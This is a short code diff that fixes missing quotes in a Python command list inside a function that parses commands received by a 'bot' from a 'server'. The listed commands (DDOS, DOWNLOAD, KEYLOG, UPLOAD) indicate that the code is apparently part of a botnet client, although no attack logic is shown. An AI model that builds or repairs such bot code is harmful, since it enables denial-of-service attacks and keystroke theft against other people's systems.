@@ -53,7 +53,7 @@ def most_common(list):
 
 #End of deferred chain to execute commands once they've been received
 def get_cmd(value,server,bot):
-	commands = ['DDOS','DOWNLOAD','KEYLOG', UPLOAD]
+	commands = ['DDOS','DOWNLOAD','KEYLOG','UPLOAD']
 	try:
 		x = value.split()
 		cmd = x[0]
